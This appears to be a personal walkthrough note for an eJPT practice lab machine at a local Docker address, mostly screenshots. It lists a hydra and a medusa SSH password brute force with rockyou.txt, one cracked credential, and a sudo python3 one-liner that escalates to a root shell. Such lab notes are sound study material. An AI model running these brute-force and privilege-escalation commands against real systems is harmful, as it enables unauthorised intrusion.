- --
- Tags: #ejptmachine #john #hydra #medusa 
---

![Pasted image 20250222185527](../../Fotos/Pasted%20image%2020250222185527.png)

![Pasted image 20250222185615](../../Fotos/Pasted%20image%2020250222185615.png)

`hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64`

![Pasted image 20250222190835](../../Fotos/Pasted%20image%2020250222190835.png)

- a : secret 

![Pasted image 20250222190928](../../Fotos/Pasted%20image%2020250222190928.png)

![Pasted image 20250222190939](../../Fotos/Pasted%20image%2020250222190939.png)

![Pasted image 20250222191020](../../Fotos/Pasted%20image%2020250222191020.png)

*Los archivos asociados a servidores se almacenan en `/srv`*

![Pasted image 20250222191304](../../Fotos/Pasted%20image%2020250222191304.png)

![Pasted image 20250222191359](../../Fotos/Pasted%20image%2020250222191359.png)

![Pasted image 20250222191442](../../Fotos/Pasted%20image%2020250222191442.png)

![Pasted image 20250222193259](../../Fotos/Pasted%20image%2020250222193259.png)

![Pasted image 20250222193334](../../Fotos/Pasted%20image%2020250222193334.png)

`medusa -h 172.17.0.2 -u spencer -P /usr/share/wordlists/rockyou.txt -M ssh`

![Pasted image 20250222193533](../../Fotos/Pasted%20image%2020250222193533.png)

![Pasted image 20250222193627](../../Fotos/Pasted%20image%2020250222193627.png)

![Pasted image 20250222193642](../../Fotos/Pasted%20image%2020250222193642.png)

`sudo python3 -c 'import os; os.system("/bin/sh")'`

![Pasted image 20250222194150](../../Fotos/Pasted%20image%2020250222194150.png)








